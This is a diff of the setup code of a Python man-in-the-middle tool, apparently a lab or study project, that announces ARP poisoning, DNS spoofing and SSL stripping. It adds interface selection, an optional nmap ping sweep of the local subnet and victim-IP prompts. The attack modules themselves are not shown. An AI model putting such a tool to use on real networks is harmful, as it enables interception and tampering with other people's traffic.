@@ -4,6 +4,7 @@ from dns_learner import DNSLearner
 from ssl_stripping import SSLStrip
 
 import scapy.all as scapy
+import scapy.arch as scarch
 import logging
 import threading
 import time
@@ -12,19 +13,29 @@ import nmap
 def setup():
     # Setup attack
     try:
+        print("> This is a tool for an ARP poisoning and DNS spoofing attack, with SSL stripping functionality.")
+        time.sleep(1)
+
+        # Pick interface to spoof through
+        ifaces = scarch.get_if_list()
+        print(f"> First, please choose an interface to scan from the following: {ifaces}")
+        iface = input("> Input your chosen interface: ")
+
         # Probe subnet for hosts
-        subnet = input("> Input the subnet to probe: ")
-        nm = nmap.PortScanner()
-        nm.scan(subnet, arguments="-sP")
-        i = 0
-        for host in nm.all_hosts():
-            print(f"{i}. {host}")
-            i += 1
+        probe = input("> Probe the subnet for available hosts? Note: This will ping every machine on the network! [Y/N] ").strip().lower()
+        if probe == 'y' or probe == 'yes':
+            nm = nmap.PortScanner()
+            print(nm.scan(f"{scarch.get_if_addr(iface)}/24", arguments="-sP"))
+            i = 0
+            for host in nm.all_hosts():
+                print(f"{i}. {host}")
+                i += 1
+        else:
+            print("> No probing.")
 
         # Select target hosts
         victim = input("> Input the victim IP: ")
         site = input("> Input the website IP: ")
-        iface = input("> Input the interface to spoof through: ")
 
         # Set aggressiveness of the attack (how often the ARP tables are being poisoned)
         while True:
@@ -37,7 +48,7 @@ def setup():
             except ValueError:
                 print(">! Please enter an integer.")
     except KeyboardInterrupt:
-        print("> \nAborted. Exiting...")
+        print("\n> Aborted. Exiting...")
         exit(0)
 
     return iface, victim, site, timer
@@ -86,6 +97,7 @@ def run(iface, victim, site, timer):
     except KeyboardInterrupt:
         # Program should stop on CTRL+C
         stop_event.set()
+        print("\n> Attack is being cancelled. Please wait...")
 
         arp_thread.join()
         dns_learn_thread.join()
